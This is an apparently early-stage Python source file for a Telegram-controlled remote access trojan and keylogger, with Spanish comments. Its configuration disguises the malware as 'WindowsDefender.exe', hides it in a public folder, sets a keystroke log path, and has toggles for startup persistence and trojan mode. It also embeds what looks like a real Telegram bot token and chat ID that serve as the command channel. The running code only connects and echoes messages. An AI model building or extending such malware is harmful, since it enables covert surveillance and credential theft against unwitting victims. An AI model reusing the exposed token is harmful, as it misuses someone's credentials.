#██████╗░░█████╗░████████╗  ██████╗░██╗░░░██╗
#██╔══██╗██╔══██╗╚══██╔══╝  ██╔══██╗╚██╗░██╔╝
#██████╔╝███████║░░░██║░░░  ██████╔╝░╚████╔╝░
#██╔══██╗██╔══██║░░░██║░░░  ██╔═══╝░░░╚██╔╝░░
#██║░░██║██║░░██║░░░██║░░░  ██║░░░░░░░░██║░░░
#╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░  ╚═╝░░░░░░░░╚═╝░░░
#░██████╗██████╗░██╗░░░██╗ ████████╗███████╗██╗░░░░░███████╗░██████╗░██████╗░░█████╗░███╗░░░███╗
#██╔════╝██╔══██╗╚██╗░██╔╝ ╚══██╔══╝██╔════╝██║░░░░░██╔════╝██╔════╝░██╔══██╗██╔══██╗████╗░████║
#╚█████╗░██████╔╝░╚████╔╝░ ░░░██║░░░█████╗░░██║░░░░░█████╗░░██║░░██╗░██████╔╝███████║██╔████╔██║
#░╚═══██╗██╔═══╝░░░╚██╔╝░░ ░░░██║░░░██╔══╝░░██║░░░░░██╔══╝░░██║░░╚██╗██╔══██╗██╔══██║██║╚██╔╝██║
#██████╔╝██║░░░░░░░░██║░░░ ░░░██║░░░███████╗███████╗███████╗╚██████╔╝██║░░██║██║░░██║██║░╚═╝░██║
#╚═════╝░╚═╝░░░░░░░░╚═╝░░░ ░░░╚═╝░░░╚══════╝╚══════╝╚══════╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝ v1.0
import time

import telepot
from telepot.loop import MessageLoop


class Config:
    def __init__(self):
        self.NAME_KEY = "WindowsDefender" + ".exe"  # Nombre del Keylogger // Debe ser exactamente igual al Compilado *.exe
        self.NAME_REG = "Windows Defeder REG"  # Nombre del Keylogger en el registro
        self.LOG_KEY_PATH = "C:\\Users\\Public\\Security\\Settings" + "\\"  # Ruta del Registro de teclas
        self.LOG_NAME = "reg" + "." + "k"
        self.PATH_HIDDEN = "C:\\Users\\Public\\Security\\Windows Defender" + "\\"  # Ruta donde se esconderá el KEYLOGGER
        self.PATH_KEY = self.PATH_HIDDEN + self.NAME_KEY  # <No cambiar>
        self.PATH_LOG = self.LOG_KEY_PATH + self.LOG_NAME  # <No cambiar>
    class Developer:
        def __init__(self):
            self.STARUP = False
            self.TROJAN = False
            self.DELAY = 1
            self.CONSOLE_DEBUG = False
    class TelegramBot:
        def __init__(self):
            self.ID = 831756903  # ID Principal [Obligatorio]
            self.ID_2 = 000000000  # ID secundario [Opcional]
            self.ID_3 = 000000000  # ID Terciario  [Opcional]
            self.TOKEN = "1238108150:AAGdB66CsS_5fKpgVnOXvO8w9eSrT2V5n50"  # TOKEN de tu Bot [Obligatorio]
            # Personalize
            self.LEN_TEXT = 2  # 3600  #    [Longitud maxima por mensaje es de = 4000] # Solo se enviará el registro si sobrepasa la longitud especificada







def handle(msg):
    content_type, chat_type, chat_id = telepot.glance(msg)
    print(content_type, chat_type, chat_id)

    if content_type == 'text':
        bot.sendMessage(chat_id, msg['text'])


# Starting Script
if __name__ == '__main__':
    print("[RAT] Start")

    # Instancia Bot con Token
    bot = telepot.Bot(Config.TelegramBot().TOKEN)
    bot.sendMessage(Config.TelegramBot().ID, "Usted está en linea ...")
    MessageLoop(bot, handle).run_as_thread()
    print('Listening ...')

    # Keep the program running.
    while True:
        time.sleep(10)



    """
    
    Information() # Show Information

    updater = Updater(T_TOKEN, use_context=True)
    # Get the dispatcher to register handlers
    dp = updater.dispatcher
    # on different commands - answer in Telegram
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("help", help))
    dp.add_handler(CommandHandler("sumar", sumar))
    # on noncommand i.e message - echo the message on Telegram
    dp.add_handler(MessageHandler(Filters.text, pizza))
    # log all errors
    dp.add_error_handler(error)
    # Start the Bot
    updater.start_polling()
    updater.idle()



    # Espera comandos
    print("Esperando comandos...")
    # pythoncom.PumpMessages()  # Escucha los comandos
    """



